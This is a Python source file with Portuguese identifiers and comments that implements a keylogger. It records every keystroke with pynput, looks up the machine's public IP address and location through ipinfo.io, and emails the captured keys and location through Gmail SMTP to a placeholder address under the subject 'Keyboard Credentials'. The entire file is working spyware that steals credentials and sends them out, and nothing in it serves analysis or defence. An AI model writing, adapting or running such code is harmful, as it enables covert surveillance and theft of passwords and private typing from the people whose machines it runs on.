import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import requests
from pynput.keyboard import Key, Listener

teclas = []

def processar_tecla(tecla):
    if hasattr(tecla, 'char'):
        return tecla.char
    elif tecla == Key.space:
        return ' '
    else:
        return str(tecla)

def log(tecla):
    tecla_processada = processar_tecla(tecla)
    if tecla_processada is not None:
        teclas.append(tecla_processada)

def obter_informacoes_ip():
    try:
        resposta = requests.get("https://ipinfo.io")

        if resposta.status_code == 200:
            dados_ip = resposta.json()

            info_string = f"IP Público: {dados_ip['ip']}\n"
            info_string += f"Cidade: {dados_ip['city']}\n"
            info_string += f"Região: {dados_ip['region']}\n"
            info_string += f"País: {dados_ip['country']}\n"
            info_string += f"Provedor de Internet: {dados_ip['org']}\n"

            return info_string
        else:
            return f"Falha na solicitação: {resposta.status_code}"

    except Exception as e:
        return f"Erro ao obter informações do IP: {e}"

def send_email(remetente_email, remetente_senha, destinatario_email, subject, body):
    try:
        smtp_server = "smtp.gmail.com"
        smtp_port = 587

        mensagem = MIMEMultipart()
        mensagem['From'] = remetente_email
        mensagem['To'] = destinatario_email
        mensagem['Subject'] = subject

        mensagem.attach(MIMEText(body, 'plain'))

        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login(remetente_email, remetente_senha)
            server.send_message(mensagem)

        print("Email enviado com sucesso!")

    except Exception as e:
        print(f"Erro ao enviar e-mail: {e}")

if __name__ == "__main__":
    remetente_email = "seu_email@gmail.com"  # Substitua pelo seu e-mail
    remetente_senha = "senha_de_token_para_app"  # Substitua pela sua senha de e-mail
    destinatario_email = "Email_de_destino@gmail.com"  # Substitua pelo endereço de e-mail do destinatário
    subject = "Keyboard Credentials"

    try:
        with Listener(on_press=log) as monitor:
            monitor.join()

    except KeyboardInterrupt or AttributeError:
        print('Encerrando...')

    finally:
        resultado_teclas = ' '.join(teclas)
        info_data = obter_informacoes_ip()

        corpo_email = f"""##########

Keyboard: {resultado_teclas}

Informações de IP:
{info_data}

##########"""

        send_email(remetente_email, remetente_senha, destinatario_email, subject, corpo_email)

